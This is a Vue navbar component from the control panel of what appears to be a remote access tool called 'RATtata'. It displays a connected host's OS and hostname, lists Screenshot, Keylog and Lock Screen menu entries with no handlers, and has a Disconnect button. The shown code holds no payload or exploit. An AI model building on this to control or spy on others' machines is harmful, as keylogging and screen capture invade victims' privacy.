<template>
  <nav class="navbar is-light is-unselectable" role="navigation" aria-label="main navigation">
    <div class="navbar-brand">
      <div class="navbar-item">
        <b-icon :icon="osToIcon(data.os || data.data.platform || data.data.logofile)"></b-icon>
      </div>
      <div class="navbar-item">{{data.name || data.data.hostname}}</div>
    </div>
    <div class="navbar-menu">
      <div class="navbar-start">
        <!-- <a class="navbar-item">Home</a>
        <a class="navbar-item">Documentation</a>-->

        <div class="navbar-item has-dropdown is-hoverable">
          <a class="navbar-link">more</a>

          <div class="navbar-dropdown">
            <a class="navbar-item">Screenshot</a>
            <a class="navbar-item">Keylog</a>
            <a class="navbar-item">Lock Screen</a>
            <hr class="navbar-divider" />
            <a class="navbar-item">...</a>
          </div>
        </div>
      </div>

      <div class="navbar-end">
        <div class="navbar-item" v-if="clientConnected">
          <div class="buttons">
             <b-button type="is-danger" @click="disconnect">
              <strong>Disconnect</strong>
             </b-button>
          </div>
        </div>
      </div>
    </div>
  </nav>
</template>


<script>
import { osToIcon } from "../_iconUtils";

export default {
  props: ["iden"],
  methods: {
    osToIcon,
    disconnect() {
      window.RATtata.connections[this.iden].close()
      delete window.RATtata.connections[this.iden]
    }
  },
  computed: {
    clientConnected() {
      return window.RATtata.connections[this.iden];
    },
    data() {
      return this.$store.state.Connections.servers[this.iden];
    }
  }
};
</script>

<style>
nav.navbar {
  position: sticky;
  top: 0;

  cursor: default;
}
</style>